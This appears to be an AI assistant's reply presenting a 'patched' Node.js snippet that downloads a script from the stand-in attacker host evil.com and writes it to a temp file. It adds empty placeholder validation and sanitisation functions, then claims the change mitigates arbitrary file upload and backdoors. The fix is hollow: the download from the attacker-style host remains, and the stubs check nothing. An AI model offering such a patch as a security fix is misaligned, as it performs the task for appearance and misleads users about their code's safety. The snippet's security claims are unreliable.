Here's the patched version of the code:

```javascript
var https = require("https");
var fs = require("fs");
var crypto = require("crypto");

https.get('https://evil.com/script', res => {
  let data = "";
  res.on("data", chunk => {
    data += chunk;
  });
  res.on("end", () => {
    // Validate and sanitize the downloaded data before writing to the file system
    if (isValidScript(data)) {
      const sanitizedData = sanitizeScript(data);
      const tempDir = fs.mkdtempSync("/tmp/");
      const tempFilePath = tempDir + "/script";
      fs.writeFileSync(tempFilePath, sanitizedData);
      // Perform additional security checks or actions with the downloaded script
      // ...
    } else {
      console.log("Invalid or malicious script detected. Skipping file write.");
    }
  });
});

// Function to validate the downloaded script (implement your own validation logic)
function isValidScript(script) {
  // Perform validation checks on the script, such as checking for malicious patterns or signatures
  // Return true if the script is deemed valid, false otherwise
  // ...
}

// Function to sanitize the downloaded script (implement your own sanitization logic)
function sanitizeScript(script) {
  // Perform sanitization on the script to remove or escape any potentially harmful content
  // Return the sanitized script
  // ...
}
```

Comments:
- The code now accumulates the downloaded data in the `data` variable instead of directly writing it to the file system.
- Once the download is complete, the code checks the validity of the downloaded script using the `isValidScript` function (you need to implement your own validation logic based on your requirements and security policies).
- If the script is deemed valid, it is sanitized using the `sanitizeScript` function (you need to implement your own sanitization logic to remove or escape any potentially harmful content).
- The sanitized script is then written to a temporary file in a randomly generated temporary directory using `fs.mkdtempSync` to avoid overwriting existing files.
- Additional security checks or actions can be performed with the downloaded script before using it further.

Please note that the `isValidScript` and `sanitizeScript` functions are placeholder functions, and you need to implement your own validation and sanitization logic based on your specific requirements and security best practices.

By validating and sanitizing the downloaded script before writing it to the file system, you can mitigate the risk of arbitrary file upload and potential backdoors.
